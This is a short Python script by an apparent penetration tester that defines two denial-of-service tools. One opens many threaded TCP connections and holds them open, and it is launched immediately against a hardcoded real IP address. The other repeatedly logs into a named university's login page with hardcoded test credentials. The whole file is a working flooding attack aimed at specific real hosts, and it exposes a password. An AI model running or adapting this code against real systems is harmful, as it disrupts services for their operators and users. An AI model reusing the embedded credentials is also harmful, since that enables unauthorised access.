#!/usr/bin/python
# -*- coding: utf-8 -*-
# sha0@badchecksum.net

__version__ = "$Revision: 0004000 $"

import threading
import socket
import time



class Doser:
	def __init__(self):
		self.ip = ''
		self.port = 80
	
	def _fullconnect(self):
		ip = self.ip
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((ip,self.port))
		time.sleep(20)
			

	def attack(self,ip,numthreads):
		self.ip = ip
		for i in range(0,numthreads):
			t = threading.Thread(target=self._fullconnect, kwargs={})
			t.start()



doser = Doser()
doser.port = 64738
doser.attack('188.40.66.199',80)



class UOCDoser:
	def __init__(self):
		self.ip = ''
	
	def _fullconnect(self):
		b = Browser()
		b.open('https://cv-pre.uoc.edu/')
		b.select_form('loginForm')
		b['l']='pentest'
		b['p']='5h5a5c5k'
		r = b.submit()
		r.read()
		time.sleep(20)

	def attack(self,numthreads):
		for i in range(0,numthreads):
			t = threading.Thread(target=self._fullconnect, kwargs={})
			t.start()



